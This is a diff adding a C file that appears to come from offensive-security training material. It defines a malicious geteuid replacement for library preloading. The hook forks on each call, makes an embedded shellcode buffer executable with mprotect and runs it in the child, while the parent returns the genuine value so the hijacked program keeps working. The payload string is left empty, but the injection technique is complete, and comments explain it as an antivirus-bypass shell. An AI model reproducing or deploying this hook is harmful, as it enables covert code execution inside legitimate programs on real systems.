@@ -1,0 +1,44 @@
+#define _GNU_SOURCE
+#include <sys/mman.h> 
+#include <stdlib.h>
+#include <stdio.h>
+#include <dlfcn.h>
+#include <unistd.h>
+
+uid_t geteuid(void)
+{
+    //payload
+    char buf[] = 
+    "";
+
+    typeof(geteuid) *old_geteuid;
+    old_geteuid = dlsym(RTLD_NEXT, "geteuid");
+      
+      //This line in the code determines whether or not the result of the fork call is zero. 
+      //If it is, we are running inside the newly created child process, and can run our shell as we did with our earlier AV bypass shell application. 
+      //Otherwise, it will return the expected value of geteuid to the original calling program so it can continue as intended.
+       if (fork() == 0) 
+        {
+                intptr_t pagesize = sysconf(_SC_PAGESIZE);
+                if (mprotect((void *)(((intptr_t)buf) & ~(pagesize - 1)),
+                 pagesize, PROT_READ|PROT_EXEC)) {
+                        perror("mprotect");
+                        return -1;
+                } 
+                //The code within the fork branch checks that the shellcode resides on an executable memory page before executing it. 
+                //The reason for this additional step is that the -f PIC compilation flag relocates our shellcode to the library .data section in order to make it position independent. 
+                //Specifically, the code gets the size of a memory page so it knows how much memory to access. 
+                ///It then changes the page of memory that contains our shellcode and makes it executable using mprotect. 
+                //It does this by setting its access properties to PROT_READ and PROT_EXEC, which makes our code readable and executable. 
+                //If changing the memory permissions fails, the program will exit with a return code of “-1”.
+                int (*ret)() = (int(*)())buf;
+                ret();
+        }
+        else
+        {
+                printf("HACK: returning from function...\n");
+                return (*old_geteuid)();
+        }
+        printf("HACK: Returning from main...\n");
+        return -2;
+}
